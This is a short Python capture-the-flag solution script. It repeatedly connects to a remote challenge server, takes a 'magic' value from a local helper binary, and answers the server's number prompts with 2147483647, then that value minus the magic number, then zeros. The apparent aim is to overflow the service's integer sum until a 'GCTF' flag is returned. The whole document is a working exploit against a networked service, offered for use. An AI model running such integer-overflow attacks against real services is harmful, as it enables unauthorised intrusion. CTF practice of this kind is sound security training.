#! /usr/bin/env python
##
from socket import socket
from subprocess import check_output, Popen, PIPE
import time
import random
import sys

i = 0
while 1:
    i += 1
    s = socket()
    s.connect(('play.spgame.site', 9993))
    magic = int(check_output(['./get_magic']))
    iters = 0

    while 1:
        data = s.recv(4096)

        if data == '':
            break

        if 'Type in a number:' in data:
            iters += 1
            if iters == 1:
                response = 2147483647
            elif iters == 2:
                response = 2147483647 - (magic) 
            elif iters >= 3:
                response = 0

            response = str(response) + "\n"
            # print(response)
            s.send(response)
        elif 'Your sum' in data:
            print(data.strip())
        elif 'GCTF' in data:
            raise Exception('GCTF FLAG FOUND %s' % data)
    print(str(i))
    time.sleep(0.5)